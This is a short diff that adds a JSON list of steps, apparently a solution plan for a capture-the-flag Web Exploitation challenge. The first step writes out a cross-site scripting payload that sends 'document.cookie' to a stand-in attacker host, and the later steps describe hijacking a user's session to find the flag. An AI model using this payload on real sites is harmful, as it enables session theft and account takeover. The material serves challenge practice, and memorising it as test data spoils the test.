@@ -1,0 +1,7 @@
+[
+    "Craft malicious JavaScript code to steal a user's session cookie using 'document.location=': 'https://attacker.com/cookie_stealer?cookie='+encodeURIComponent(document.cookie);",
+    "Submit the payload as input in the vulnerable field of the web application",
+    "A user visits the page and their browser executes the malicious JavaScript code, sending their session cookie to the attacker-controlled domain",
+    "Steal the session cookie of an authenticated user and hijack their session to access restricted areas of the web application",
+    "Inside one of the restricted areas, uncover the flag for the Web Exploitation challenge"
+]
